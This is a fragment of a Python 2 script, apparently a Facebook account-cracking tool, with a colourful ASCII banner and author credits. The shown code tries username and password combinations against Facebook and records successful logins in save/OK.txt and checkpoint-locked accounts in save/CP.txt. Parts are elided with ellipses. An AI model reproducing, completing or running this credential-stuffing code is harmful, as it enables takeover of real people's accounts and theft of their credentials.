...
\033[97;1mo--o    O      o o--o   o-o   o-o  o-O-o 
\033[91;1m|   |  / \     | |   | o   o o   o   |   
\033[92;1mO-Oo  o---o    | O--o  |   | |   |   |   
\033[93;1m|  \  |   |\   o |     o   o o   o   |   
\033[96;1mo   o o   o o-o  o      o-o   o-o    o                                          ​                                                                                     
\x1b[0m______________________________________________
\033[95;1mAuthor   :            USMAN SHAHZAD
\033[94;1mFacebook :          USMAN RAJPOOT  
\033[92;1mGitHub   :        github.com/USMAN-RAJPOOT
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                ...
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[1;96m  [R•A•J•P•O•O•T_OK] ' + k + c + user + '  ^  ' + pass2
                    okb = open('save/OK.txt', 'a')
                    okb.write(k + c + user + pass2 + '\n')
                    okb.close()
                    oks.append(c + user + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;95m  [R•A•J•P•O•O•T_CP] ' + k + c + user + '  ^  ' + pass2
                    cps = open('save/CP.txt', 'a')
